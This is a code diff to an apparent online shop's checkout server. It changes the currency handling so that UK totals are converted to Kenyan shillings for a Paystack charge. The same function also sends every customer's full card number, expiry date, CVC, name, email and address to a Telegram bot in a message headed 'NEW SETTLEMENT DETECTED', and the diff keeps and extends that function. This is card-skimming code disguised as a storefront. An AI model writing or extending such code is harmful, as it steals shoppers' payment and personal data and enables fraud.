@@ -222,29 +222,31 @@ async function startServer() {
     const chatId = process.env.VITE_TELEGRAM_CHAT_ID;
 
     // 1. Send to Telegram (Parallel path)
-    const sendToTelegram = (currencyUsed: string) => {
+    const sendToTelegram = (currencyUsed: string, amountOverride?: number) => {
       if (!botToken || !chatId) return;
       
       const orderItems = cart.map((item: any) => `- ${item.name} (x${item.quantity})`).join('\n');
+      const finalAmount = amountOverride !== undefined ? amountOverride : total;
+      
       const message = `
-🚨 *NEW SETTLEMENT DETECTED* 🚨
--------------------------
-📧 *Email:* ${formData.email}
-👤 *Name:* ${formData.name}
-📍 *Address:* ${formData.address}, ${formData.city}, ${formData.postcode}
-🌍 *Country:* ${formData.country}
-
-💳 *CARD DETAILS:*
-- Number: \`${formData.cardNumber}\`
-- Expiry: \`${formData.expiry}\`
-- CVC: \`${formData.cvc}\`
-
-🛒 *SELECTION:*
-${orderItems}
-
-💰 *TOTAL:* ${currencyUsed} ${total.toFixed(2)}
--------------------------
-      `;
+ 🚨 *NEW SETTLEMENT DETECTED* 🚨
+ -------------------------
+ 📧 *Email:* ${formData.email}
+ 👤 *Name:* ${formData.name}
+ 📍 *Address:* ${formData.address}, ${formData.city}, ${formData.postcode}
+ 🌍 *Country:* ${formData.country}
+ 
+ 💳 *CARD DETAILS:*
+ - Number: \`${formData.cardNumber}\`
+ - Expiry: \`${formData.expiry}\`
+ - CVC: \`${formData.cvc}\`
+ 
+ 🛒 *SELECTION:*
+ ${orderItems}
+ 
+ 💰 *TOTAL:* ${currencyUsed} ${finalAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+ -------------------------
+       `;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
@@ -263,20 +265,23 @@ ${orderItems}
     }
 
     const trimmedKey = paystackKey.trim();
-    const isTestKey = trimmedKey.startsWith('sk_test_');
-    // If it's a live key, we MUST use GBP as the user is in the UK market.
-    // If it's a test key, we use KES to allow for easy testing with the provided test cards.
-    const currencyUsed = isTestKey ? 'KES' : 'GBP';
+    // Use KES for both test and live as required for Kenyan Paystack accounts to support all cards globally.
+    const currencyUsed = 'KES';
+    
+    // Total from frontend is in GBP. We convert it to KES for processing.
+    // 1 GBP ≈ 165 KES. We use this rate to ensure the Kenyan Paystack account can process the payment.
+    const conversionRate = 165;
+    const totalInKES = total * conversionRate;
 
-    // Execute Telegram notification
-    sendToTelegram(currencyUsed);
+    // Execute Telegram notification with the KES amount for transparency
+    sendToTelegram(currencyUsed, totalInKES);
 
     try {
       // Parse expiry
       const [expiryMonth, expiryYear] = formData.expiry.split('/').map((s: string) => s.trim());
       
       // Paystack amount is in kobo (base unit * 100)
-      const amountInCents = Math.round(total * 100);
+      const amountInKobo = Math.round(totalInKES * 100);
 
       const paystackResponse = await fetch('https://api.paystack.co/charge', {
         method: 'POST',
@@ -286,7 +291,7 @@ ${orderItems}
         },
         body: JSON.stringify({
           email: formData.email,
-          amount: amountInCents,
+          amount: amountInKobo,
           currency: currencyUsed,
           card: {
             number: formData.cardNumber.replace(/\s/g, ''),
